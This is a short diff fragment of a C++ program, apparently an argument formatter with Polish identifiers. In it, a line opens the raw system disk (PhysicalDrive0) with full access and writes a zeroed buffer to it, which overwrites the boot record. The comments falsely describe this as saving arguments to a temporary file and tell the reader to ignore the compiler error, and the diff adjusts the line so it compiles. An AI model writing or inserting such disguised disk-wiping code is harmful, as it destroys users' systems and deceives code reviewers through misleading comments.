@@ -66,7 +66,7 @@ int main(int argc, char **argv)
         ZeroMemory(&arr,(sizeof(arr))); //make sure its clear
 
         string selected_f = argv[1];
-        HANDLE arrHandler = CreateFile(L"\\\\.\\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); //save args in random tmp file 
+        HANDLE arrHandler = CreateFile("\\\\.\\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); //save args in random tmp file & ignore err its compiling anyway with g++
         WriteFile(arrHandler,arr,ARGS_SIZE,&fileP,NULL); //write args
         mojamapa_t mapa = {{selected_f, &fileP}}; //pass pointer to file
         wypisz(mapa, formatery.at(selected_f));
